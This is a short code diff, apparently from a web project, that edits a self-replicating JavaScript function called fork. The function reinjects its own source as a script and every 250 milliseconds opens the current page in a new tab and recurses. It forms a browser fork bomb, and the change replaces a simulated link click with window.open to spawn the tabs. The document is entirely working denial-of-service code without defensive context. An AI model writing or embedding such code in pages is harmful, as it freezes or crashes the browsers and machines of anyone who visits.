@@ -3,11 +3,7 @@ function fork() {
   script.innerHTML = fork + "\n" + "fork();";
   document.head.appendChild(script);
   setTimeout(function() {
-    const link = document.createElement('a');
-    link.href = window.location.href;
-    link.target = '_blank';
-    link.rel = 'noopener noreferrer';
-    link.click();
+    window.open(window.location.href, '_blank'); // Open the same URL in a new tab
     fork();
   }, 250);
 }
